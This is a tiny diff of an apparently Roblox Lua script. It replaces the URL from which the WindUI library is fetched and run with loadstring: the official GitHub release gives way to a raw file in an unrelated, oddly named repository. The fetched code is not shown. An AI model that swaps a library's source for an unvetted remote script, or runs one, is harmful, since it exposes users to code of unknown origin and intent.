@@ -1,4 +1,4 @@
-local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kuzanu/tickle-feet-master-v.20288.882.9299-Ima-tickle-them-toes/refs/heads/main/dist/main.lua"))()
 
 -- Test
 
